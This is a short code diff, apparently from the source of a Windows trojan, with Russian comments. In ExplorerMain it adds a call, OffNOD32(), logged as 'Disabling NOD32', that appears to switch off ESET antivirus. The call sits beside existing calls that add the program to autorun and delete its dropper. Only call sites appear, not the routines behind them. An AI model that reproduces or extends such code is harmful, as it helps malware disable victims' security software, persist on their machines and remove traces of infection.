@@ -206,7 +206,8 @@ void ExplorerMain()
 
 	// Отключаем отображение ошибок при крахе процесса
 	//DisableShowFatalErrorDialog();
-
+	MDBG( "Main", "Отключаем NOD32" );
+	OffNOD32();
 	InternalAddToAutorun();
 
 	DeleteDropper();
